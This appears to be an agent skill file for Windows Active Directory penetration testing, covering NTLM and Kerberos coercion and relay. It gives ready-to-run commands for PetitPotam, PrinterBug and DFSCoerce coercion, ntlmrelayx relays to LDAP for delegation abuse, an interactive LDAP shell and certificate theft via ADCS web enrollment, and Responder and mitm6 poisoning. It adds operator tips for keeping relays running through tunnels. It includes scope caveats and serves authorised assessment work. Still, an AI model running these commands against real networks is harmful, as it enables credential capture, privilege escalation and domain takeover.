---
name: windows-coerce-relay
description: NTLM/Kerberos coercion and relay — Responder, PetitPotam, PrinterBug, DFSCoerce, ntlmrelayx, LDAP relay, ESC8, RBCD from relay, mitm6. Use when SMB signing is off or LDAP signing is not required.
metadata:
  version: '1.0'
---

# Coercion and relay

Only with a **listener you control** on the in-scope network. Poisoning (LLMNR/NBT-NS/mitm6) is noisy; prefer **targeted coerce** of a machine account.

## Prerequisites

```
nxc smb <range> --gen-relay-list relay.txt    # signing:False
nxc ldap <dc-ip>                               # LDAP signing / channel binding
```

- Relay **SMB→SMB** needs target **signing:False**.
- Relay **SMB→LDAP** needs LDAP signing not required (typical on many DCs).
- Relay **SMB→HTTP certsrv** is ESC8 (`windows-adcs`).
- If **all SMB signing True** and LDAP signing enforced, SMB NTLM relay is largely dead — try Kerberos relay / HTTP / ESC11.

## Coerce (force a host to auth to you)

| Method | Unauth? | Command sketch |
|---|---|---|
| PetitPotam (MS-EFSR) | often yes | `petitpotam.py <listener> <target>` / `nxc smb <t> -M petitpotam -o LISTENER=<ip>` |
| PrinterBug / SpoolSample | needs domain user | `printerbug.py <domain>/<user>:<pass>@<target> <listener>` |
| DFSCoerce | often yes | `dfscoerce.py -d <domain> <listener> <target>` |
| ShadowCoerce / FileSystem | varies | `shadowcoerce.py` |
| Drop the Mic (WebDAV) | | WebClient + HTTP listener |
| RPC Printer / MS-RPRN | | `rpcdump` shows spoolss |
| PrivExchange | Exchange | Push EWS notification |

Always coerce a **DC$** or high-value server to a listener that is **not** signing-enforced.

## ntlmrelayx patterns

```
# hashes + socks (SMB targets without signing)
ntlmrelayx.py -tf relay.txt -smb2support -socks -of netntlm

# LDAP → RBCD (add FAKE$ allowed-to-act on target computer)
ntlmrelayx.py -t ldaps://<dc-ip> -smb2support --delegate-access --escalate-user FAKE01$

# LDAP shell
ntlmrelayx.py -t ldap://<dc-ip> -smb2support --no-dump --interactive

# ADCS web enrollment (ESC8)
ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

After RBCD relay: `windows-kerberos` `getST.py -impersonate Administrator`. After ESC8: `certipy auth -pfx`. After SOCKS: `proxychains secretsdump` / `wmiexec`.

## Field notes (learned the hard way)

- **Callback listeners:** when the job runs through the L3 tunnel, check
  `TUNNEL_CALLBACK_ADDRS` (`local_port=bind_ip:port,...`). Bind your relay to
  `127.0.0.1:<local_port>` in the pod and coerce targets to `<bind_ip:port>` on
  the jumpbox. SMB coercion always dials **445**, so SMB relays only work when
  the listener entry has bind port 445 (e.g. `8445=<ip>:445` →
  `ntlmrelayx.py ... --smb-port 8445`, coerce to `<ip>`).
- **ntlmrelayx exits silently when stdin closes.** Background it as
  `sleep infinity | ntlmrelayx.py ... >>/tmp/relay.log 2>&1 &`, never plain `&`.
- **ADCS relay:** use `/opt/relayenv/bin/ntlmrelayx.py ... --adcs`. The global
  impacket crashes on `--adcs` (pyOpenSSL≥23.2 removed `X509Req`) and
  `certipy relay` is broken with impacket 0.13. certipy **auth/find** work fine.
- **DC$ same-host relay is dead on patched DCs:** relaying DC$ to the DC's own
  certsrv returns 401 (NTLM loopback detection). Relay a **workstation$** to the
  DC's ADCS instead, or use ESC6 SAN injection (`windows-adcs`) — neither needs DC$.
- **Coercion reality check:** unauthenticated PetitPotam is often patched (the
  callback then authenticates anonymously — useless). **Authenticated** MS-EFSR
  with any domain cred still coerces DC$. Check the accessible named pipes
  first: spoolss is commonly off, leaving efsrpc as the only vector.
- **pkill self-match:** `pkill -f foo` inside a `bash -c "... foo ..."` kills the
  wrapper shell. Use the bracket trick (`pkill -f "[f]oo"`) or separate calls.

## Poisoning (optional, scoped)

```
responder -I <iface> -dwv          # LLMNR / NBT-NS / WPAD
mitm6 -d <domain>                  # IPv6 DNS takeover → WPAD / LDAP
```

Use only if the assessment allows active MitM. Capture NetNTLMv2; relay instead of cracking.

## Kerberos relay

`krbrelayx` / KrbRelayUp: coerce Kerberos to LDAP (RBCD) when NTLM relay is blocked. Needs a suitable SPN and (often) a domain-joined attacker host.

## Reflect / Local NTLM

PetitPotam to `127.0.0.1` / `localhost` for local privilege (Print Spooler / NTLM reflection) is `windows-privesc`, not cross-host relay.

## Findings

- Unsigned SMB + successful coerce/relay to admin ⇒ critical.
- LDAP relay adding RBCD ⇒ critical even before `getST`.
- Poisoning that only yields a workstation hash ⇒ medium + knowledge, not DA.
